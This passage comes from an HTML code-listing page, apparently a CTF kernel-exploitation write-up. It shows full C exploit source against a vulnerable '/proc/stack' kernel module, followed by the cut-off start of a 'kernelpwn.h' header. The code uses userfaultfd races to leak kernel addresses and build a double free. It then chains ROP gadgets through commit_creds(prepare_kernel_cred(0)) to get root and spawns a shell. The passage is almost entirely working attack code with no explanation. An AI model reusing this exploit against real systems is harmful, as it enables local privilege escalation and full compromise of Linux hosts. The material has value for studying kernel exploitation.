class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-type">int</span>             dev_fd;<br><span class="hljs-type">size_t</span>          seq_fd;<br><span class="hljs-type">size_t</span>          seq_fd_reserve[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">char</span>     *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span>   page_size;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">leak_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffd_msg</span> msg;<br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_copy</span> uffdio_copy;<br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> pollfd;<br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = <span class="hljs-built_in">poll</span>(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = <span class="hljs-built_in">read</span>(uffd, &amp;msg, <span class="hljs-built_in">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] push trapped in userfaultfd.&quot;</span>);<br>        <span class="hljs-built_in">pop</span>(&amp;kernel_offset);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak ptr: %p\n&quot;</span>, kernel_offset);<br>        kernel_offset -= <span class="hljs-number">0xffffffff81c37bc0</span>;<br>        kernel_base += kernel_offset;<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">double_free_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffd_msg</span> msg;<br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_copy</span> uffdio_copy;<br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> pollfd;<br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = <span class="hljs-built_in">poll</span>(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = <span class="hljs-built_in">read</span>(uffd, &amp;msg, <span class="hljs-built_in">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pop trapped in userfaultfd.&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct the double free...&quot;</span>);<br>        <span class="hljs-built_in">pop</span>(page);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff81034505</span>;<br><span class="hljs-type">size_t</span>  xchg_rax_rdi_ret = <span class="hljs-number">0xffffffff81d8df6d</span>;<br><span class="hljs-type">size_t</span>  mov_rdi_rax_pop_rbp_ret = <span class="hljs-number">0xffffffff8121f89a</span>;<br><span class="hljs-type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81600a34</span>;<br><span class="hljs-type">long</span>    flag_fd;<br><span class="hljs-type">char</span>    flag_buf[<span class="hljs-number">0x100</span>];<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">hijack_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffd_msg</span> msg;<br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_copy</span> uffdio_copy;<br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> pollfd;<br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = <span class="hljs-built_in">poll</span>(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = <span class="hljs-built_in">read</span>(uffd, &amp;msg, <span class="hljs-built_in">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] setxattr trapped in userfaultfd.&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger now...&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)<br>            <span class="hljs-built_in">close</span>(seq_fd_reserve[i]);<br><br>        <span class="hljs-comment">// trigger</span><br>        pop_rdi_ret += kernel_offset;<br>        xchg_rax_rdi_ret += kernel_offset;<br>        mov_rdi_rax_pop_rbp_ret += kernel_offset;<br>        prepare_kernel_cred = <span class="hljs-number">0xffffffff81069e00</span> + kernel_offset;<br>        commit_creds = <span class="hljs-number">0xffffffff81069c10</span> + kernel_offset;<br>        swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="hljs-number">0x10</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] gadget: %p\n&quot;</span>, swapgs_restore_regs_and_return_to_usermode);<br>        __asm__(<br>            <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>            <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>            <span class="hljs-string">&quot;mov r13,   pop_rdi_ret;&quot;</span><br>            <span class="hljs-string">&quot;mov r12,   0;&quot;</span><br>            <span class="hljs-string">&quot;mov rbp,   prepare_kernel_cred;&quot;</span><br>            <span class="hljs-string">&quot;mov rbx,   mov_rdi_rax_pop_rbp_ret;&quot;</span>    <br>            <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>            <span class="hljs-string">&quot;mov r10,   commit_creds;&quot;</span><br>            <span class="hljs-string">&quot;mov r9,    swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>            <span class="hljs-string">&quot;mov r8,    0x99999999;&quot;</span><br>            <span class="hljs-string">&quot;xor rax,   rax;&quot;</span><br>            <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>            <span class="hljs-string">&quot;mov rdx,   8;&quot;</span><br>            <span class="hljs-string">&quot;mov rsi,   rsp;&quot;</span><br>            <span class="hljs-string">&quot;mov rdi,   seq_fd;&quot;</span><br>            <span class="hljs-string">&quot;syscall&quot;</span><br>        );<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] back to userland successfully!&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] uid: %d gid: %d\n&quot;</span>, <span class="hljs-built_in">getuid</span>(), <span class="hljs-built_in">getgid</span>());<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] execve root shell now...&quot;</span>);<br>        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x57AC0001</span>, data) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;push!&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x57AC0002</span>, data) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;pop!&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">size_t</span>      data[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">char</span>        *uffd_buf_leak;<br>    <span class="hljs-type">char</span>        *uffd_buf_uaf;<br>    <span class="hljs-type">char</span>        *uffd_buf_hack;<br>    <span class="hljs-type">int</span>         pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         shm_id;<br>    <span class="hljs-type">char</span>        *shm_addr;<br><br>    dev_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/stack&quot;</span>, O_RDWR);<br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    page_size = <span class="hljs-built_in">sysconf</span>(_SC_PAGE_SIZE);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)<br>        <span class="hljs-keyword">if</span> ((seq_fd_reserve[i] = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;seq reserve!&quot;</span>);<br>    <br>    uffd_buf_leak = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">registerUserFaultFd</span>(uffd_buf_leak, page_size, leak_thread);<br><br>    shm_id = <span class="hljs-built_in">shmget</span>(<span class="hljs-number">114514</span>, <span class="hljs-number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);<br>    <span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;shmget!&quot;</span>);<br>    shm_addr = <span class="hljs-built_in">shmat</span>(shm_id, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (shm_addr &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;shmat!&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">shmdt</span>(shm_addr) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;shmdt!&quot;</span>);<br><br>    <span class="hljs-built_in">push</span>(uffd_buf_leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);<br><br>    uffd_buf_uaf = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">registerUserFaultFd</span>(uffd_buf_uaf, page_size, double_free_thread);<br>    <span class="hljs-built_in">push</span>(<span class="hljs-string">&quot;7c00&quot;</span>);<br>    <span class="hljs-built_in">pop</span>(uffd_buf_uaf);<br><br>    uffd_buf_hack = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, page_size * <span class="hljs-number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">registerUserFaultFd</span>(uffd_buf_hack + page_size, page_size, hijack_thread);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] gadget: %p\n&quot;</span>, <span class="hljs-number">0xffffffff814d51c0</span> + kernel_offset);<br>    *(<span class="hljs-type">size_t</span> *)(uffd_buf_hack + page_size - <span class="hljs-number">8</span>) = <span class="hljs-number">0xffffffff814d51c0</span> + kernel_offset;<br><br>    seq_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    <span class="hljs-built_in">setxattr</span>(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-string">&quot;7c00&quot;</span>, uffd_buf_hack + page_size - <span class="hljs-number">8</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>kernelpwn.h</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 